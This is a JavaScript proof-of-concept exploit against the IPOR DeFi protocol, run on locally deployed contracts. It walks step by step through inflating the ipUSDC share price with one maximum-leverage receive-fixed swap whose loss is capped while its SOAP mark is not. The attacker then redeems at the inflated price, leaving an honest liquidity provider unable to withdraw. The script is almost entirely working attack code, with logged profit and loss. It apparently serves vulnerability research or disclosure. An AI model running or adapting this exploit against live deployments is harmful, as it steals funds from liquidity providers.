// IPOR protocol — LP share-price manipulation through an uncapped SOAP mark.
// Real contracts from github.com/IPOR-Labs/ipor-protocol @ 434327d, compiled with solc 0.8.26 (see compile.js),
// deployed and wired exactly like test/utils/factory/IporProtocolFactory.sol (see poc.js).
const { ethers } = require('ethers');
const { main, RISK_BASE, signRisk, E18, PAD } = require('./poc');

const TENOR_ENUM = 2n; // IporTypes.SwapTenor.DAYS_90
const TENOR_DAYS = 90n;
const INDEX = 5n * 10n ** 16n; // 5% APR, the IPOR USDC index
const ATK_USDC = PAD(500_000); // 6-dec USDC the attacker puts in as liquidity
const HONEST_USDC = PAD(500_000);
const ATK_LP = ATK_USDC * 10n ** 12n; // ipUSDC is an 18-dec token
const HONEST_LP = HONEST_USDC * 10n ** 12n;
const COLLATERAL = PAD(74_000);
const LEVERAGE = 1000n * E18;
const OPENING_FEE_RATE = 5n * 10n ** 14n; // 0.05%

const f = (x) => (Number(x) / 1e6).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
const f18 = (x) => (Number(x) / 1e18).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
const line = (s) => console.log(s);

async function main2() {
    const c = await main({ openingFeeRate: OPENING_FEE_RATE });
    const { P, usdc, ipToken, oracle, treasury, ammStorage, provider, lp, atk, msgSignerWallet, pools, openViaRouter } = c;
    const lpAddr = await lp.getAddress();
    const atkAddr = await atk.getAddress();
    // the protocol itself prices the redemption: burn 1 ipUSDC (1e18) and read the USDC that comes back
    const probeRate = async () => {
        const before = await usdc.balanceOf(atkAddr);
        await (await pools.connect(atk).redeemFromAmmPoolUsdc(atkAddr, E18, { gasLimit: 9e6 })).wait();
        return (await usdc.balanceOf(atkAddr)) - before; // 6-dec USDC per 1e18 ipUSDC == the 18-dec rate
    };

    // ------------------------------------------------------------------ 1
    line('=== 1. honest state: two LPs, 500k each, ipUSDC at 1.000000 ===');
    await c.give(lp, HONEST_USDC);
    await c.give(atk, ATK_USDC + PAD(400_000));
    await (await pools.connect(lp).provideLiquidityUsdc(lpAddr, HONEST_USDC, { gasLimit: 5e6 })).wait();
    await (await pools.connect(atk).provideLiquidityUsdc(atkAddr, ATK_USDC, { gasLimit: 5e6 })).wait();
    {
        const b = await ammStorage.getBalance();
        const r = await probeRate();
        line(`ipUSDC supply=${f18(await ipToken.totalSupply())} liquidityPool=${f18(b.liquidityPool)} exchangeRate=${(Number(r) / 1e6).toFixed(6)}`);
    }

    // ------------------------------------------------------------------ 2
    line('\n=== 2. the IPOR index is published (5% APR) by the oracle service ===');
    await (await oracle.updateIndexes([{ asset: P.usdc, indexValue: INDEX, updateTimestamp: 0n, quasiIbtPrice: 0n }])).wait();
    line(`index=${(Number(INDEX) / 1e16).toFixed(2)}% APR`);

    // ------------------------------------------------------------------ 3
    line('\n=== 3. attacker opens ONE 90d receive-fixed swap at maximum leverage ===');
    const k = (LEVERAGE * OPENING_FEE_RATE * TENOR_DAYS) / (365n * E18);
    const collateralWad = (COLLATERAL * E18) / 10n ** 6n; // COLLATERAL is 6-dec USDC, maths are 18-dec
    const available = (collateralWad * (E18 + k)) / E18;
    const totalWad = available + 25n * E18 + 10n * E18; // + liquidation deposit + ipor publication fee
    const totalUsdc = (totalWad * 10n ** 6n) / E18 + 2n; // round up
    await c.give(atk, totalUsdc);
    {
        const now = BigInt((await provider.getBlock('latest')).timestamp);
        const inputs = { ...RISK_BASE, expiration: now + 3600n };
        const risk = { ...inputs, signature: signRisk(msgSignerWallet, inputs, P.usdc, TENOR_ENUM, 1n) };
        const tx = await openViaRouter
            .connect(atk)
            .openSwapReceiveFixed90daysUsdc(atkAddr, totalUsdc, 0n, LEVERAGE, risk, { gasLimit: 9e6 });
        const rc = await tx.wait();
        const swap = await ammStorage.getSwap(1, 1);
        line(`gas used=${rc.gasUsed}  collateral=${f(BigInt(swap.collateral))} notional=${f(BigInt(swap.notional))}`);
        line(`fixed rate offered by the AMM = ${(Number(BigInt(swap.fixedInterestRate)) / 1e16).toFixed(3)}%  (index 5.000% -> the demand spread floors it)`);
        line(`the trader paid ${f(totalUsdc)} USDC in total (collateral + opening fee + deposit + pub fee)`);
    }

    // ------------------------------------------------------------------ 4
    line('\n=== 4. 90 days pass; the index accrues and SOAP marks the pool a profit on the notional ===');
    await provider.send('evm_increaseTime', [Number(TENOR_DAYS) * 86400 + 60]);
    await provider.send('evm_mine', []);
    {
        const b = await ammStorage.getBalance();
        const supply = await ipToken.totalSupply();
        const r = await probeRate() * 10n ** 12n; // 6-dec USDC per ipUSDC -> 18-dec rate
        const soap = BigInt(b.liquidityPool) - (r * supply) / E18;
        line(`liquidityPool (storage) = ${f18(b.liquidityPool)}  <- unchanged, the profit exists only in SOAP`);
        line(`SOAP (receive-fixed leg) = -${f18(-soap)}  ->  it is booked as a ${f18(-soap)} USDC profit for the pool`);
        line(`marked exchange rate = ${(Number(r) / 1e18).toFixed(6)}  (1 ipUSDC = ${(Number(r) / 1e18).toFixed(2)} USDC)`);
        line(`but the trader's loss is capped at his collateral: ${f(COLLATERAL)} USDC (SwapLogicBaseV1.normalizePnlValue)`);
    }

    // ------------------------------------------------------------------ 5
    line('\n=== 5. attacker redeems ALL of his ipTokens at the marked price ===');
    let got = 0n;
    {
        const before = await usdc.balanceOf(atkAddr);
        const atkIp = await ipToken.balanceOf(atkAddr);
        await (await pools.connect(atk).redeemFromAmmPoolUsdc(atkAddr, atkIp, { gasLimit: 9e6 })).wait();
        got = (await usdc.balanceOf(atkAddr)) - before;
        line(`burned ${f18(atkIp)} ipUSDC (500,000 minus the two 1-ipUSDC rate probes) -> received ${f(got)} USDC`);
        line(`redemption price = ${(Number(got) / (Number(atkIp) / 1e18) / 1e6).toFixed(6)} (deposits were made at 1.000000)`);
    }

    // ------------------------------------------------------------------ 6
    line('\n=== 6. the honest LP is left behind ===');
    let lpOut = 0n;
    let err = '';
    for (const pct of [100n, 75n, 50n, 40n, 30n, 20n, 15n, 10n, 5n, 2n, 1n]) {
        const amt = (HONEST_LP * pct) / 100n;
        try {
            const before = await usdc.balanceOf(lpAddr);
            await pools.connect(lp).redeemFromAmmPoolUsdc.staticCall(lpAddr, amt, { gasLimit: 9e6 });
            await (await pools.connect(lp).redeemFromAmmPoolUsdc(lpAddr, amt, { gasLimit: 9e6 })).wait();
            lpOut = (await usdc.balanceOf(lpAddr)) - before;
            line(`honest LP redeemed ${pct}% of his ipTokens -> ${f(lpOut)} USDC`);
            break;
        } catch (e) {
            if (!err) err = e.shortMessage;
        }
    }
    line(`a full redemption reverts with ${err}`);

    // ------------------------------------------------------------------ 7
    line('\n=== 7. profit and loss ===');
    const cash = await usdc.balanceOf(P.treasury);
    const spent = ATK_USDC + totalUsdc;
    const profit = got - spent;
    const lpLoss = HONEST_USDC - lpOut;
    line(`attacker : -${f(ATK_USDC)} (liquidity) -${f(totalUsdc)} (swap) +${f(got)} (redemption)`);
    line(`attacker : NET ${profit > 0n ? '+' : '-'}${f(profit < 0n ? -profit : profit)} USDC`);
    line(`honest LP: -${f(HONEST_USDC)} +${f(lpOut)} -> NET -${f(lpLoss)} USDC (${f(cash - lpOut)} of the pool cash is still stuck behind the redeem guards)`);
    line(`pool cash left: ${f(cash)} USDC (${f(COLLATERAL)} of it is the abandoned collateral the pool can still collect)`);
}

main2().catch((e) => {
    console.error('FAIL', e.shortMessage || e.message);
    process.exit(1);
});
